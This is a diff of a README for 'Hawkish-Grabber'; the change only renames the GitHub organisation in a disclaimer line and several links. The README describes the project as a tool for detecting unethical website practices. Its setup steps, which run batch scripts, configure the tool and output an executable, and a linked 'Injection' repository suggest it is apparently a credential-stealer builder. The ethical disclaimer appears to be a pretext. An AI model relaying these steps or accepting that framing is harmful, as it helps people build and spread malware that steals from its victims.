@@ -30,7 +30,7 @@ Its purpose is to help individuals detect and report potential security,
 threats and unethical practices by website owners and service providers. 
 Our aim is to encourage transparency, accountability, and responsibility among online actors, 
 and to empower users to make informed decisions about their online activities. 
-Hawkish-Eyes is not intended for malicious purposes or to harm innocent parties, 
+Hawkish-Team is not intended for malicious purposes or to harm innocent parties, 
 and we strongly condemn any illegal or unethical actions that may result from its use. 
 We hope that this tool will contribute to a safer and more ethical online environment for everyone.
 ---
@@ -42,7 +42,7 @@ We hope that this tool will contribute to a safer and more ethical online enviro
 - [🔰・Features](#features)
 - [👁️・Preview](#preview)
 - [📝・Changelog](#changelog)
-- [🦜・Injection](https://github.com/Hawkish-Eyes/Hawkish-Injection)
+- [🦜・Injection](https://github.com/Hawkish-Team/Hawkish-Injection)
 - [🕵️‍♂️・Credits](#forkedfrom)
 - [💼・Term](#terms)
 
@@ -50,9 +50,9 @@ We hope that this tool will contribute to a safer and more ethical online enviro
 
 ## <a id="setup"></a> 📁 〢 Setting up
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
-2. Install [Hawkish Files](https://github.com/Hawkish-Eyes/Hawkish-Grabber/archive/refs/heads/main.zip)
-3. Install all requirements [install.bat](https://github.com/Hawkish-Eyes/Hawkish-Grabber/blob/main/install.bat)
-4. Click on start.bat [start.bat](https://github.com/Hawkish-Eyes/Hawkish-Grabber/blob/main/start.bat)
+2. Install [Hawkish Files](https://github.com/Hawkish-Team/Hawkish-Grabber/archive/refs/heads/main.zip)
+3. Install all requirements [install.bat](https://github.com/Hawkish-Team/Hawkish-Grabber/blob/main/install.bat)
+4. Click on start.bat [start.bat](https://github.com/Hawkish-Team/Hawkish-Grabber/blob/main/start.bat)
 5. Complete the configuration
 6. You have your .exe/.py file enjoy
 
